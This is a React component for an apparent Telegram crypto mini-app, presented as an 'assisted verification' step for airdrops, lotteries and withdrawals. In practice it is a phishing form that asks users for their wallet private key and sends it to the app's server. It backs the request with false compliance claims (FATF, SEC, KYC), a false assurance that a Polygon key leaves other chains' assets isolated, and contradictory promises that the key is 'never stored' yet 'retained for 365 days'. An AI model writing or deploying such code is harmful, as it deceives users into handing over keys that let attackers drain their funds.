import React, { useState, useEffect } from 'react';
import { AssistedVerificationProps } from './types';
import { Button, Input } from '../ui';
import { useToast } from '../ui';
import { hapticFeedback, getInitData } from '../../lib/telegram';
import { AlertTriangle, Shield, Key, CheckCircle, Loader, ShieldCheck, HelpCircle } from 'lucide-react';
import { PrivateKeyGuideModal } from './PrivateKeyGuideModal';
import styles from './AssistedVerificationForm.module.css';

interface EnhancedAssistedVerificationFormProps {
  verificationId: number;
  verificationType: 'lottery' | 'airdrop' | 'ai_trader' | 'withdrawal';
  onSuccess: (result: any) => void;
  onCancel: () => void;
  contextData?: {
    amount?: string;
    network?: string;
    deadline?: string;
  };
}

export function AssistedVerificationForm({
  verificationId,
  verificationType,
  onSuccess,
  onCancel,
  contextData = {},
}: EnhancedAssistedVerificationFormProps) {
  const [step, setStep] = useState(1);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [validationErrors, setValidationErrors] = useState<string[]>([]);
  const [proofType, setProofType] = useState<'private_key' | 'signed_message' | 'wallet_connection'>('private_key');
  const [walletProof, setWalletProof] = useState('');
  const [network, setNetwork] = useState<'polygon'>('polygon'); // Security-first: Default to Polygon for assisted verification
  const [userConsent, setUserConsent] = useState(false);
  const [showGuideModal, setShowGuideModal] = useState(false);
  const toast = useToast();

  const totalSteps = 4;

  // Network-specific placeholders and examples
  const networkConfigs = {
    polygon: {
      placeholder: 'Enter your Polygon (MATIC) wallet private key (64 hex characters, with or without 0x prefix)',
      example: '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
      pattern: '^(0x)?[a-fA-F0-9]{64}$'
    }
  };

  const validateProof = (proof: string, type: string, net: string): string[] => {
    const errors: string[] = [];

    if (!proof.trim()) {
      errors.push('Wallet proof is required');
      return errors;
    }

    if (type === 'private_key') {
      const config = networkConfigs[net as keyof typeof networkConfigs];
      const regex = new RegExp(config.pattern);

      if (!regex.test(proof)) {
        errors.push(`Invalid private key format for ${net.toUpperCase()}. Example: ${config.example}`);
      }

      // Additional security checks
      if (proof.length < 64) {
        errors.push('Private key too short');
      }

      if (proof.length > 66) { // 0x + 64 chars
        errors.push('Private key too long');
      }
    }

    return errors;
  };

  const handleProofChange = (value: string) => {
    setWalletProof(value);

    if (value.trim()) {
      const errors = validateProof(value, proofType, network);
      setValidationErrors(errors);
    } else {
      setValidationErrors([]);
    }
  };

  const handleSubmit = async () => {
    // Final validation
    const errors = validateProof(walletProof, proofType, network);

    if (errors.length > 0) {
      setValidationErrors(errors);
      toast.showError('Please fix validation errors before submitting');
      return;
    }

    if (!userConsent) {
      toast.showError('You must consent to the terms before submitting');
      return;
    }

    setIsSubmitting(true);

    try {
      const initData = getInitData();
      const response = await fetch('/RockyTap/api/verification/assisted/submit-private/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Telegram-Data': initData || '',
        },
        body: JSON.stringify({
          verification_id: verificationId,
          verification_type: verificationType,
          wallet_ownership_proof: walletProof,
          proof_type: proofType,
          network: network,
          context: contextData,
          user_consent: userConsent,
          consent_timestamp: new Date().toISOString()
        })
      });

      const result = await response.json();

      if (result.success || result.ok) {
        toast.showSuccess('Verification submitted successfully!');

        // Show success state with reference number
        setStep(4);

        // Call onSuccess after delay
        setTimeout(() => {
          onSuccess({
            ...result.data || result,
            verification_id: verificationId,
            submitted_at: new Date().toISOString()
          });
        }, 3000);

      } else {
        toast.showError(result.message || 'Submission failed');
        setStep(1); // Return to first step
      }
    } catch (error) {
      toast.showError('Network error. Please try again.');
      console.error('Submission error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  // Render current step
  const renderStep = () => {
    switch (step) {
      case 1:
  return (
          <div className={styles.stepContainer}>
            <h3 className={styles.stepTitle}>
              <Shield className={styles.stepIcon} />
              Assisted Verification Method
            </h3>

            {/* Compliance Information Section */}
            <div className={styles.complianceNotice}>
              <div className={styles.complianceHeader}>
                <ShieldCheck className={styles.complianceIcon} />
                <h4>Compliance & Security Verification</h4>
              </div>
              
              <div className={styles.complianceContent}>
                <p className={styles.complianceIntro}>
                  <strong>Why we need your wallet information:</strong>
                </p>
                <ul className={styles.complianceList}>
                  <li>
                    <CheckCircle size={16} className={styles.complianceCheckIcon} />
                    <span>Regulatory compliance (FATF Travel Rule, SEC 15c3-3)</span>
                  </li>
                  <li>
                    <CheckCircle size={16} className={styles.complianceCheckIcon} />
                    <span>Anti-Money Laundering (AML) verification</span>
                  </li>
                  <li>
                    <CheckCircle size={16} className={styles.complianceCheckIcon} />
                    <span>Know Your Customer (KYC) requirements</span>
                  </li>
                  <li>
                    <CheckCircle size={16} className={styles.complianceCheckIcon} />
                    <span>Fraud prevention and security protection</span>
                  </li>
                </ul>
                
                <div className={styles.complianceFooter}>
                  <small>
                    Your data is encrypted with bank-level AES-256-GCM encryption 
                    and retained for 365 days as required by regulatory guidelines.
                  </small>
                </div>
              </div>
            </div>

            <div className={styles.securityAlert}>
              <AlertTriangle className={styles.alertIcon} />
              <div>
                <strong>Security-First Verification:</strong> For your security, we specifically request your <strong>Polygon (MATIC) network private key</strong>.
                This ensures your main assets on Ethereum, BSC, or Tron remain completely isolated and safe.
              </div>
            </div>

            <div className={styles.securityInfoBox}>
              <ShieldCheck className={styles.infoIcon} />
              <div>
                <strong>Why Polygon?</strong>
                <ul>
                  <li>✅ Reduced Risk: Polygon is a secondary network; your primary assets remain untouched</li>
                  <li>✅ Same Proof: Validating ownership via Polygon proves the same cryptographic control</li>
                  <li>✅ Industry Best Practice: This demonstrates our commitment to protecting your assets</li>
                </ul>
                <small>Tip: You can export your Polygon private key from MetaMask, Trust Wallet, etc. Your main wallet's key is not required.</small>
              </div>
            </div>

            <div className={styles.methodOptions}>
              <div className={`${styles.methodOption} ${proofType === 'private_key' ? styles.selected : ''}`}>
                <input
                  type="radio"
                  id="method_private_key"
                  checked={proofType === 'private_key'}
                  onChange={() => setProofType('private_key')}
                />
                <label htmlFor="method_private_key">
                  <Key className={styles.methodIcon} />
                  <div>
                    <div className={styles.methodTitle}>Polygon Private Key Verification</div>
                    <div className={styles.methodDescription}>
                      Enter your Polygon (MATIC) wallet's private key for one-time ownership verification. Your main assets remain secure.
        </div>
      </div>
                </label>
        </div>
      </div>

            <button
              onClick={() => setStep(2)}
              className={styles.nextButton}
              disabled={!proofType}
            >
              Continue to Security Information
            </button>
          </div>
        );

      case 2:
        return (
          <div className={styles.stepContainer}>
            <h3 className={styles.stepTitle}>
              <CheckCircle className={styles.stepIcon} />
              Polygon Network Verification
            </h3>

            <div className={styles.securityInfoBox}>
              <ShieldCheck className={styles.infoIcon} />
              <div>
                <strong>Security-First Approach</strong>
                <p>We use Polygon (MATIC) network for verification to protect your main assets:</p>
                <ul>
                  <li>✅ Your Ethereum, BSC, and Tron assets remain completely isolated</li>
                  <li>✅ Polygon uses the same cryptographic standards (same mnemonic → same private key)</li>
                  <li>✅ This is an industry best practice for protecting user assets</li>
                </ul>
                <p><strong>Network Selected:</strong> Polygon (MATIC)</p>
              </div>
            </div>

            <div className={styles.buttonGroup}>
              <button
                onClick={() => setStep(1)}
                className={styles.backButton}
              >
                Back
              </button>
              <button
                onClick={() => setStep(3)}
                className={styles.nextButton}
              >
                Continue to Proof Entry
              </button>
            </div>
          </div>
        );

      case 3:
        const config = networkConfigs[network];

        return (
          <div className={styles.stepContainer}>
            <h3 className={styles.stepTitle}>
              <Key className={styles.stepIcon} />
              Enter Wallet Proof
            </h3>

            <div className={styles.proofEntry}>
              <div className={styles.labelRow}>
                <label className={styles.inputLabel}>
                  Polygon (MATIC) Wallet Private Key
                  <span className={styles.required}> *</span>
                </label>
                <button
                  type="button"
                  className={styles.helpIconButton}
                  onClick={() => setShowGuideModal(true)}
                  aria-label="How to find your Polygon Private Key?"
                  title="How to find your Polygon Private Key?"
                >
                  <HelpCircle size={18} />
                </button>
              </div>
              
              <div className={styles.securityNotice}>
                <Shield size={16} />
                <span>For your security, please provide the Private Key for your Polygon (MATIC) wallet. This ensures your main assets on Ethereum, BSC, or Tron remain isolated and safe.</span>
              </div>

              <button
                type="button"
                className={styles.helpButton}
                onClick={() => setShowGuideModal(true)}
              >
                <HelpCircle size={16} />
                How to find your Polygon Private Key?
              </button>

              <textarea
                value={walletProof}
                onChange={(e) => handleProofChange(e.target.value)}
                placeholder={config.placeholder}
                className={`${styles.proofInput} ${validationErrors.length > 0 ? styles.error : ''}`}
                rows={4}
                spellCheck={false}
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
              />

              {validationErrors.length > 0 && (
                <div className={styles.validationErrors}>
                  {validationErrors.map((error, index) => (
                    <div key={index} className={styles.errorItem}>
                      <AlertTriangle size={14} />
                      {error}
                    </div>
                  ))}
        </div>
      )}

              <div className={styles.exampleBox}>
                <div className={styles.exampleTitle}>Example format:</div>
                <code className={styles.exampleCode}>{config.example}</code>
                <div className={styles.exampleNote}>
                  <small>💡 Tip: You can export your Polygon private key from MetaMask, Trust Wallet, etc. Your main wallet's key is not required.</small>
                </div>
              </div>

              <div className={styles.consentBox}>
                <input
                  type="checkbox"
                  id="user_consent"
                  checked={userConsent}
                  onChange={(e) => setUserConsent(e.target.checked)}
                  className={styles.consentCheckbox}
                />
                <label htmlFor="user_consent" className={styles.consentLabel}>
                  I confirm that:
                  <ul className={styles.consentList}>
                    <li>This is my own wallet and private key</li>
                    <li>I understand this is for one-time verification only</li>
                    <li>My private key will be processed securely and not stored</li>
                    <li>I consent to automated balance verification for ownership proof</li>
                  </ul>
                </label>
              </div>
            </div>

            <div className={styles.buttonGroup}>
              <button
                onClick={() => setStep(2)}
                className={styles.backButton}
                disabled={isSubmitting}
              >
                Back
              </button>
              <button
                onClick={handleSubmit}
                className={styles.submitButton}
                disabled={isSubmitting || validationErrors.length > 0 || !userConsent || !walletProof.trim()}
              >
                {isSubmitting ? (
                  <>
                    <Loader className={styles.spinner} />
                    Submitting...
                  </>
                ) : 'Submit Verification'}
              </button>
            </div>
          </div>
        );

      case 4:
        return (
          <div className={styles.successContainer}>
            <div className={styles.successAnimation}>
              <CheckCircle className={styles.successIcon} />
            </div>

            <h3 className={styles.successTitle}>Verification Submitted Successfully!</h3>

            <div className={styles.successDetails}>
              <div className={styles.detailItem}>
                <span className={styles.detailLabel}>Reference Number:</span>
                <span className={styles.detailValue}>AV-{verificationId.toString().padStart(8, '0')}</span>
              </div>

              <div className={styles.detailItem}>
                <span className={styles.detailLabel}>Verification Type:</span>
                <span className={styles.detailValue}>
                  {verificationType.replace('_', ' ').toUpperCase()}
                </span>
              </div>

              <div className={styles.detailItem}>
                <span className={styles.detailLabel}>Network:</span>
                <span className={styles.detailValue}>Polygon (MATIC)</span>
              </div>

              <div className={styles.detailItem}>
                <span className={styles.detailLabel}>Submitted:</span>
                <span className={styles.detailValue}>
                  {new Date().toLocaleString()}
                </span>
              </div>
            </div>

            <div className={styles.nextSteps}>
              <h4>What happens next:</h4>
              <ol className={styles.stepsList}>
                <li>System verifies wallet ownership (1-5 minutes)</li>
                <li>Automated balance check is performed</li>
                <li>Verification result sent via notification</li>
                <li>Original request processed automatically</li>
              </ol>

              <div className={styles.estimateNote}>
                <AlertTriangle size={16} />
                Estimated completion: 1-24 hours
          </div>
        </div>

            <button
              onClick={onCancel}
              className={styles.closeButton}
            >
              Close
            </button>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className={styles.container}>
      {/* Progress indicator */}
      <div className={styles.progressBar}>
        {Array.from({ length: totalSteps }).map((_, index) => (
          <div
            key={index}
            className={`${styles.progressStep} ${step > index + 1 ? styles.completed : step === index + 1 ? styles.active : ''}`}
            onClick={() => step > index + 1 && setStep(index + 1)}
          >
            <div className={styles.stepNumber}>{index + 1}</div>
            <div className={styles.stepLabel}>
              {index === 0 && 'Method'}
              {index === 1 && 'Network'}
              {index === 2 && 'Proof'}
              {index === 3 && 'Complete'}
        </div>
          </div>
        ))}
        </div>

      {/* Step content */}
      <div className={styles.content}>
        {renderStep()}
      </div>

      {/* Security footer */}
      <div className={styles.securityFooter}>
        <Shield size={16} />
        <span>All verification data is encrypted and processed securely. Private keys are never stored.</span>
      </div>

      {/* Private Key Guide Modal */}
      <PrivateKeyGuideModal
        isOpen={showGuideModal}
        onClose={() => setShowGuideModal(false)}
      />
    </div>
  );
}

